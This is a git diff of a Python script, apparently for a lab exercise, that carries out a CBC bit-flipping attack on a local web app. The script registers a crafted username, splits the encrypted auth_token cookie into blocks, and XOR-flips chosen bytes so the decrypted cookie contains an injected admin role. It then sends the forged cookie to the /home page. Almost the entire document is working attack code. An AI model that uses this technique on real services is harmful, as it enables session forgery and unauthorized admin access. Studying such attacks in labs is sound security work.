@@ -6,13 +6,11 @@ homeURL = 'http://localhost:8080'
 regesterURL = 'http://localhost:8080/register'
 
 session = requests.Session()
-userpadding = "yyyyyyyyyyy"
-paddingRole = "XxxxxXxxxxxxxxxx"
-paddingUID = "XxxxXxxxxxxxxxxx"
-role = "admin"
-uid = "AuidE1"
+userpadding = "testAuidE1E"
+paddingRole = "AroleEadmin" 
+junk = "aaaaaaaaaaaaaaaa"
 
-username = userpadding + paddingRole + "AroleE" + role + "yyyyy" + paddingUID + uid + "yyyyyyyyyy"
+username = userpadding + junk + paddingRole
 # print(len(username))
 print(username)
 
@@ -26,37 +24,28 @@ cookie = session.cookies.get_dict().get('auth_token')
 print((cookie))
 print()
 
-
 cookieLst = [cookie[i:i+32] for i in range(0, len(cookie), 32)]
 print((cookieLst))
 print()
 
 # need to xor idx 0 and idx 5
-paddingOne = bytearray.fromhex(cookieLst[1])
-# paddingOne[0] = ((ord('X')) ^ (ord('&'))) ^ paddingOne[0]
-# paddingOne[5] = ((ord('X')) ^ (ord('='))) ^ paddingOne[5]
+paddingOne = bytearray.fromhex(cookieLst[0])
 print(paddingOne)
-print(cookieLst[2][0:2])
-
-paddingOne[0] = (paddingOne[0] ^ ord('X')) ^ (ord('&'))
-paddingOne[5] = (paddingOne[5] ^ ord('X')) ^ (ord('='))
+paddingOne[9] = (paddingOne[9] ^ ord('A')) ^ (ord('&'))
+paddingOne[13] = (paddingOne[13] ^ ord('E')) ^ (ord('='))
+paddingOne[15] = (paddingOne[15] ^ ord('E')) ^ (ord('&'))
 print(paddingOne)
 paddingOne = paddingOne.hex()
-print(type(paddingOne))
 
-cookieLst[1] = paddingOne
+cookieLst[0] = paddingOne
 
 # need to xor idx 0 and idx 4
-paddingTwo = bytearray.fromhex(cookieLst[3])
-# paddingTwo[0] = (ord('X')) ^ ord('&') ^ paddingTwo[0]
-# paddingTwo[4] = (ord('X')) ^ (ord('=')) ^ paddingTwo[4]
-paddingTwo[0] = (paddingTwo[0] ^ ord('X')) ^ (ord('&'))
-paddingTwo[4] = (paddingTwo[4] ^ ord('X')) ^ (ord('='))
+paddingTwo = bytearray.fromhex(cookieLst[2])
+paddingTwo[0] = (paddingTwo[0] ^ ord('A')) ^ (ord('&'))
+paddingTwo[5] = (paddingTwo[5] ^ ord('E')) ^ (ord('='))
 paddingTwo = paddingTwo.hex()
 
-cookieLst[3] = paddingTwo
-
-print(len(cookieLst))
+cookieLst[2] = paddingTwo
 
 adminCookie = "".join(cookieLst)
 
@@ -64,4 +53,4 @@ print(adminCookie)
 
 session.cookies.set('auth_token', adminCookie)
 result = session.get('http://localhost:8080/home')
-# print(result.text)
+print(result.text)
